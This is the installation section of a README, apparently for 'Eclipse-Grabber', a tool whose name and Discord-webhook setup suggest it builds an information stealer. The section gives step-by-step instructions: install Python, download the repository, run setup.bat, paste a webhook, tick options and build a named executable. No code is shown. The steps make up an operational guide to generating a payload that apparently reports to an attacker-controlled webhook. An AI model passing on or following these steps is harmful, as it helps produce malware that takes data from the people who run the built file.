## Installation

### 1. [Download](https://www.python.org/downloads/) Python:

```
Make sure you have Python 3.11+ installed and it is added to your path.
```
### 2. [Download](https://github.com/ShredGman/Eclipse-Grabber/archive/refs/heads/main.zip) The Files:

```
Once you've downloaded the files extract the folder so it's no longer a .zip file.
```
### 3. Open The setup.bat File:

```
You dont need to manually install any modules. Just opening setup.bat will install them for you. If successfull the setup.bat will then open up the gui.
```
### 4. Create A Webhook:

```
If you don't know how to make a webhook you can follow this guide: https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks
Once created, paste the webhook into the webhook prompt.
```
### 5. Configurable Options:

```
Now once you've done that you can tick the options that you want enabled and anything you don't understand you can go 
to the documentation where each option is explained.
```
### 6. Build The File
```
To finally create the file you must enter a filename and press build. Once fully built the build button will say 'Built File'.
```
### 7. What Now?

```
The file you built will now appear in the current folder with the name you set.
```
